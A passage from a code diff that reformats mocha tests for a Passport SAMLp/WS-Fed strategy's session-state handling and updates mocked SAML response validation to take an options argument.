expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-    \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that errors due to custom store supplying error', function() {\n         var request, err;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/error';\n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'foos7473';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/error';\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'foos7473';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n         });\n \n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('something went wrong verifying state');\n         });\n       });\n-      \n+\n       describe('that errors due to custom store throwing error', function() {\n         var request, err;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-          \n-              req.url = '/exception';\n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'foos7473';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/exception';\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'foos7473';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n         });\n \n         it('should error', function() {\n\n@@ -229,57 +229,57 @@\ndescribe('samlp - using custom session state store', function() {\n       });\n     });\n   });\n-  \n+\n   describe('that accepts meta argument and supplies state', function() {\n     function CustomStore() {}\n-    \n+\n     CustomStore.prototype.verify = function(req, state, meta, cb) {\n       req.customStoreVerifyCalled = req.customStoreVerifyCalled ? req.customStoreVerifyCalled++ : 1;\n       return cb(null, true, { returnTo: 'http://www.example.com/' });\n     };\n-    \n+\n     describe('processing response to authorization request', function() {\n-      \n+\n       describe('that was approved without info', function() {\n         var strategy = new Strategy({\n-          protocol: 'samlp',\n-          path: '/callback',\n-          realm: 'https://auth0-dev-ed.my.salesforce.com',\n-          identityProviderUrl: 'http://www.example.com/samlp',\n-          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-          store: new CustomStore()\n-        },\n-        function (profile, done) {\n-          return done(null, profile);\n-        });\n+              protocol: 'samlp',\n+              path: '/callback',\n+              realm: 'https://auth0-dev-ed.my.salesforce.com',\n+              identityProviderUrl: 'http://www.example.com/samlp',\n+              thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+              store: new CustomStore()\n+            },\n+            function (profile, done) {\n+              return done(null, profile);\n+            });\n \n-        strategy._samlp.validateSamlResponse = function(token, done) {\n-          expect(token).to.be.an('object');\n+        strategy._samlp.validateSamlResponse = function(token, _options, done) {\n+          expect(token).to.be.a('string');\n           done(null, { id: '1234' });\n         };\n-        \n+\n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-        \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -293,52 +293,52 @@\ndescribe('samlp - using custom session state store', function() {\n           expect(info.state).to.be.an('object');\n           expect(info.state.returnTo).to.equal('http://www.example.com/');\n         });\n-  \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n-      \n+\n       describe('that was approved with info', function() {\n         var strategy = new Strategy({\n-          protocol: 'samlp',\n-          path: '/callback',\n-          realm: 'https://auth0-dev-ed.my.salesforce.com',\n-          identityProviderUrl: 'http://www.example.com/samlp',\n-          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-          store: new CustomStore()\n-        },\n-        function (profile, done) {\n-          return done(null, profile, { message: 'Hello' });\n-        });\n+              protocol: 'samlp',\n+              path: '/callback',\n+              realm: 'https://auth0-dev-ed.my.salesforce.com',\n+              identityProviderUrl: 'http://www.example.com/samlp',\n+              thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+              store: new CustomStore()\n+            },\n+            function (profile, done) {\n+              return done(null, profile, { message: 'Hello' });\n+            });\n \n-        strategy._samlp.validateSamlResponse = function(token, done) {\n-          expect(token).to.be.an('object');\n+        strategy._samlp.validateSamlResponse = function(token, _options, done) {\n+          expect(token).to.be.a('string');\n           done(null, { id: '1234' });\n         };\n \n         var request, user, info;\n \n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-        \n-              req.url = '/login';\n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'foos7473';\n-              req.method = 'POST';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.url = '/login';\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'foos7473';\n+                req.method = 'POST';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n         });\n \n         it('should supply user', function() {\n\n@@ -353,11 +353,11 @@\ndescribe('samlp - using custom session state store', function() {\n           expect(info.state).to.be.an('object');\n           expect(info.state.returnTo).to.equal('http://www.example.com/');\n         });\n-  \n+\n         it('should verify state using custom store', function() {\n           expect(request.customStoreVerifyCalled).to.equal(1);\n         });\n       });\n     });\n   });\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: test/state/samlp.state.session.tests.js:\n```\n@@ -9,9 +9,9 @@\nchai.use(passport);\n describe('samlp - using default session state store', function() {\n \n   var SAMLResponse = 'PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIHhtbG5zOnNhbWw9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphc3NlcnRpb24iIElEPSJfOGU4ZGM1ZjY5YTk4Y2M0YzFmZjM0MjdlNWNlMzQ2MDZmZDY3MmY5MWU2IiBWZXJzaW9uPSIyLjAiIElzc3VlSW5zdGFudD0iMjAxNC0wNy0xN1QwMTowMTo0OFoiIERlc3RpbmF0aW9uPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvaW5kZXgucGhwP2FjcyIgSW5SZXNwb25zZVRvPSJPTkVMT0dJTl80ZmVlM2IwNDYzOTVjNGU3NTEwMTFlOTdmODkwMGI1MjczZDU2Njg1Ij4NCiAgPHNhbWw6SXNzdWVyPmh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vbWV0YWRhdGEucGhwPC9zYW1sOklzc3Vlcj4NCiAgPHNhbWxwOlN0YXR1cz4NCiAgICA8c2FtbHA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+DQogIDwvc2FtbHA6U3RhdHVzPg0KICA8c2FtbDpBc3NlcnRpb24geG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiBJRD0iX2Q3MWEzYThlOWZjYzQ1YzllOWQyNDhlZjcwNDkzOTNmYzhmMDRlNWY3NSIgVmVyc2lvbj0iMi4wIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIj4NCiAgICA8c2FtbDpJc3N1ZXI+aHR0cDovL2lkcC5leGFtcGxlLmNvbS9tZXRhZGF0YS5waHA8L3NhbWw6SXNzdWVyPg0KICAgIDxzYW1sOlN1YmplY3Q+DQogICAgICA8c2FtbDpOYW1lSUQgU1BOYW1lUXVhbGlmaWVyPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvbWV0YWRhdGEucGhwIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI+X2NlM2QyOTQ4YjRjZjIwMTQ2ZGVlMGEwYjNkZDZmNjliNmNmODZmNjJkNzwvc2FtbDpOYW1lSUQ+DQogICAgICA8c2FtbDpTdWJqZWN0Q29uZmlybWF0aW9uIE1ldGhvZD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmNtOmJlYXJlciI+DQogICAgICAgIDxzYW1sOlN1YmplY3RDb25maXJtYXRpb25EYXRhIE5vdE9uT3JBZnRlcj0iMjAyNC0wMS0xOFQwNjoyMTo0OFoiIFJlY2lwaWVudD0iaHR0cDovL3NwLmV4YW1wbGUuY29tL2RlbW8xL2luZGV4LnBocD9hY3MiIEluUmVzcG9uc2VUbz0iT05FTE9HSU5fNGZlZTNiMDQ2Mzk1YzRlNzUxMDExZTk3Zjg5MDBiNTI3M2Q1NjY4NSIvPg0KICAgICAgPC9zYW1sOlN1YmplY3RDb25maXJtYXRpb24+DQogICAgPC9zYW1sOlN1YmplY3Q+DQogICAgPHNhbWw6Q29uZGl0aW9ucyBOb3RCZWZvcmU9IjIwMTQtMDctMTdUMDE6MDE6MThaIiBOb3RPbk9yQWZ0ZXI9IjIwMjQtMDEtMThUMDY6MjE6NDhaIj4NCiAgICAgIDxzYW1sOkF1ZGllbmNlUmVzdHJpY3Rpb24+DQogICAgICAgIDxzYW1sOkF1ZGllbmNlPmh0dHA6Ly9zcC5leGFtcGxlLmNvbS9kZW1vMS9tZXRhZGF0YS5waHA8L3NhbWw6QXVkaWVuY2U+DQogICAgICA8L3NhbWw6QXVkaWVuY2VSZXN0cmljdGlvbj4NCiAgICA8L3NhbWw6Q29uZGl0aW9ucz4NCiAgICA8c2FtbDpBdXRoblN0YXRlbWVudCBBdXRobkluc3RhbnQ9IjIwMTQtMDctMTdUMDE6MDE6NDhaIiBTZXNzaW9uTm90T25PckFmdGVyPSIyMDI0LTA3LTE3VDA5OjAxOjQ4WiIgU2Vzc2lvbkluZGV4PSJfYmU5OTY3YWJkOTA0ZGRjYWUzYzBlYjQxODlhZGJlM2Y3MWUzMjdjZjkzIj4NCiAgICAgIDxzYW1sOkF1dGhuQ29udGV4dD4NCiAgICAgICAgPHNhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+dXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFjOmNsYXNzZXM6UGFzc3dvcmQ8L3NhbWw6QXV0aG5Db250ZXh0Q2xhc3NSZWY+DQogICAgICA8L3NhbWw6QXV0aG5Db250ZXh0Pg0KICAgIDwvc2FtbDpBdXRoblN0YXRlbWVudD4NCiAgICA8c2FtbDpBdHRyaWJ1dGVTdGF0ZW1lbnQ+DQogICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0idWlkIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OmJhc2ljIj4NCiAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+dGVzdDwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4NCiAgICAgIDwvc2FtbDpBdHRyaWJ1dGU+DQogICAgICA8c2FtbDpBdHRyaWJ1dGUgTmFtZT0ibWFpbCIgTmFtZUZvcm1hdD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmF0dHJuYW1lLWZvcm1hdDpiYXNpYyI+DQogICAgICAgIDxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPnRlc3RAZXhhbXBsZS5jb208L3NhbWw6QXR0cmlidXRlVmFsdWU+DQogICAgICA8L3NhbWw6QXR0cmlidXRlPg0KICAgICAgPHNhbWw6QXR0cmlidXRlIE5hbWU9ImVkdVBlcnNvbkFmZmlsaWF0aW9uIiBOYW1lRm9ybWF0PSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXR0cm5hbWUtZm9ybWF0OmJhc2ljIj4NCiAgICAgICAgPHNhbWw6QXR0cmlidXRlVmFsdWUgeHNpOnR5cGU9InhzOnN0cmluZyI+dXNlcnM8L3NhbWw6QXR0cmlidXRlVmFsdWU+DQogICAgICAgIDxzYW1sOkF0dHJpYnV0ZVZhbHVlIHhzaTp0eXBlPSJ4czpzdHJpbmciPmV4YW1wbGVyb2xlMTwvc2FtbDpBdHRyaWJ1dGVWYWx1ZT4NCiAgICAgIDwvc2FtbDpBdHRyaWJ1dGU+DQogICAgPC9zYW1sOkF0dHJpYnV0ZVN0YXRlbWVudD4NCiAgPC9zYW1sOkFzc2VydGlvbj4NCjwvc2FtbHA6UmVzcG9uc2U+';\n-  \n+\n   describe('without session key option', function() {\n-    \n+\n     describe('issuing authorization request', function() {\n       var strategy = new Strategy({\n         protocol: 'samlp',\n\n@@ -21,421 +21,421 @@\ndescribe('samlp - using default session state store', function() {\n         thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n         state: true\n       }, function () {});\n-      \n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.RelayState).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n           expect(request.session['samlp:www.example.com'].state).to.have.length(24);\n           expect(request.session['samlp:www.example.com'].state).to.equal(u.query.RelayState);\n         });\n       });\n-      \n+\n       describe('that redirects to service provider with other data in session', function() {\n         var request, url;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-              req.session['samlp:www.example.com'] = {};\n-              req.session['samlp:www.example.com'].foo = 'bar';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+                req.session['samlp:www.example.com'] = {};\n+                req.session['samlp:www.example.com'].foo = 'bar';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.RelayState).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n-        \n+\n           expect(request.session['samlp:www.example.com'].state).to.have.length(24);\n           expect(request.session['samlp:www.example.com'].state).to.equal(u.query.RelayState);\n         });\n-        \n+\n         it('should preserve other data in session', function() {\n           expect(request.session['samlp:www.example.com'].foo).to.equal('bar');\n         });\n       });\n-      \n+\n       describe('that errors due to lack of session support in app', function() {\n         var request, err;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('Authentication requires session support when using state. Did you forget to use express-session middleware?');\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n       var strategy = new Strategy({\n-        protocol: 'samlp',\n-        path: '/callback',\n-        realm: 'https://auth0-dev-ed.my.salesforce.com',\n-        identityProviderUrl: 'http://www.example.com/samlp',\n-        thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-        state: true\n-      },\n-      function (profile, done) {\n-        return done(null, profile, { message: 'Hello' });\n-      });\n+            protocol: 'samlp',\n+            path: '/callback',\n+            realm: 'https://auth0-dev-ed.my.salesforce.com',\n+            identityProviderUrl: 'http://www.example.com/samlp',\n+            thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+            state: true\n+          },\n+          function (profile, done) {\n+            return done(null, profile, { message: 'Hello' });\n+          });\n \n-      strategy._samlp.validateSamlResponse = function(token, done) {\n-        expect(token).to.be.an('object');\n+      strategy._samlp.validateSamlResponse = function(token, options, done) {\n+        expect(token).to.be.a('string');\n         done(null, { id: '1234' });\n       };\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['samlp:www.example.com'] = {};\n-              req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['samlp:www.example.com'] = {};\n+                req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['samlp:www.example.com']).to.be.undefined;\n         });\n       });\n-      \n+\n       describe('that was approved with other data in the session', function() {\n         var request, user, info;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['samlp:www.example.com'] = {};\n-              req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.session['samlp:www.example.com'].foo = 'bar';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['samlp:www.example.com'] = {};\n+                req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.session['samlp:www.example.com'].foo = 'bar';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should preserve other data from session', function() {\n           expect(request.session['samlp:www.example.com'].state).to.be.undefined;\n           expect(request.session['samlp:www.example.com'].foo).to.equal('bar');\n         });\n       });\n-      \n+\n       describe('that fails due to state being invalid', function() {\n         var request, info, status;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['samlp:www.example.com'] = {};\n-              req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK-WRONG';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['samlp:www.example.com'] = {};\n+                req.session['samlp:www.example.com']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Invalid authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['samlp:www.example.com']).to.be.undefined;\n         });\n       });\n-      \n+\n       describe('that fails due to provider-specific state not found in session', function() {\n         var request, info, status;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Unable to verify authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n       });\n-      \n+\n       describe('that fails due to provider-specific state lacking state value', function() {\n         var request, info, status;\n-  \n+\n         before(function(done) {\n           chai.passport.use(strategy)\n-            .fail(function(i, s) {\n-              info = i;\n-              status = s;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['samlp:www.example.com'] = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .fail(function(i, s) {\n+                info = i;\n+                status = s;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['samlp:www.example.com'] = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Unable to verify authorization request state.');\n         });\n-      \n+\n         it('should supply status', function() {\n           expect(status).to.equal(403);\n         });\n       });\n-      \n+\n       describe('that errors due to lack of session support in app', function() {\n         var request, err;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .error(function(e) {\n-              err = e;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .error(function(e) {\n+                err = e;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should error', function() {\n           expect(err).to.be.an.instanceof(Error);\n           expect(err.message).to.equal('Authentication requires session support when using state. Did you forget to use express-session middleware?');\n         });\n       });\n     });\n   });\n-  \n+\n   describe('with session key option', function() {\n     var strategy = new Strategy({\n-      protocol: 'samlp',\n-      path: '/callback',\n-      realm: 'https://auth0-dev-ed.my.salesforce.com',\n-      identityProviderUrl: 'http://www.example.com/samlp',\n-      thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n-      state: true,\n-      sessionKey: 'samlp:example'\n-    },\n-    function (profile, done) {\n-      return done(null, profile, { message: 'Hello' });\n-    });\n+          protocol: 'samlp',\n+          path: '/callback',\n+          realm: 'https://auth0-dev-ed.my.salesforce.com',\n+          identityProviderUrl: 'http://www.example.com/samlp',\n+          thumbprints: ['5ca6e1202eafc0a63a5b93a43572eb2376fed309'],\n+          state: true,\n+          sessionKey: 'samlp:example'\n+        },\n+        function (profile, done) {\n+          return done(null, profile, { message: 'Hello' });\n+        });\n \n-    strategy._samlp.validateSamlResponse = function(token, done) {\n-      expect(token).to.be.an('object');\n+    strategy._samlp.validateSamlResponse = function(token, _options, done) {\n+      expect(token).to.be.a('string');\n       done(null, { id: '1234' });\n     };\n-    \n+\n     describe('issuing authorization request', function() {\n-      \n+\n       describe('that redirects to service provider', function() {\n         var request, url;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .redirect(function(u) {\n-              url = u;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-              req.session = {};\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .redirect(function(u) {\n+                url = u;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+                req.session = {};\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should be redirected', function() {\n           var u = uri.parse(url, true);\n           expect(u.query.RelayState).to.have.length(24);\n         });\n-      \n+\n         it('should save state in session', function() {\n           var u = uri.parse(url, true);\n-        \n+\n           expect(request.session['samlp:example'].state).to.have.length(24);\n           expect(request.session['samlp:example'].state).to.equal(u.query.RelayState);\n         });\n       });\n     });\n-    \n+\n     describe('processing response to authorization request', function() {\n-      \n+\n       describe('that was approved', function() {\n         var request, user, info;\n-  \n+\n         before(function (done) {\n           chai.passport.use(strategy)\n-            .success(function(u, i) {\n-              user = u;\n-              info = i;\n-              done();\n-            })\n-            .req(function(req) {\n-              request = req;\n-            \n-              req.body = {};\n-              req.body.SAMLResponse = SAMLResponse;\n-              req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.method = 'POST';\n-              req.session = {};\n-              req.session['samlp:example'] = {};\n-              req.session['samlp:example']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n-              req.get = function(){\n-                return '';\n-              };\n-            })\n-            .authenticate({});\n-        });\n-  \n+              .success(function(u, i) {\n+                user = u;\n+                info = i;\n+                done();\n+              })\n+              .req(function(req) {\n+                request = req;\n+\n+                req.body = {};\n+                req.body.SAMLResponse = SAMLResponse;\n+                req.body.RelayState = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.method = 'POST';\n+                req.session = {};\n+                req.session['samlp:example'] = {};\n+                req.session['samlp:example']['state'] = 'DkbychwKu8kBaJoLE5yeR5NK';\n+                req.get = function(){\n+                  return '';\n+                };\n+              })\n+              .authenticate({});\n+        });\n+\n         it('should supply user', function() {\n           expect(user).to.be.an('object');\n           expect(user.id).to.equal('1234');\n         });\n-  \n+\n         it('should supply info', function() {\n           expect(info).to.be.an('object');\n           expect(info.message).to.equal('Hello');\n         });\n-      \n+\n         it('should remove state from session', function() {\n           expect(request.session['samlp:example']).to.be.undefined;\n         });\n       });\n     });\n   });\n-});\n+});\n\\ No newline at end of file\n```\n\nFilename: test/state/wsfed.state.custom.tests.js:\n```\n@@ -1,162 +1,166 @@\n-var chai      = require('chai');\n-var expect    = require('chai').expect;\n-var passport  = require('chai-passport-strategy');\n-var Strategy  = require('../../lib/passport-wsfed-saml2').Strategy;\n+const chai      = require('chai');\n+const 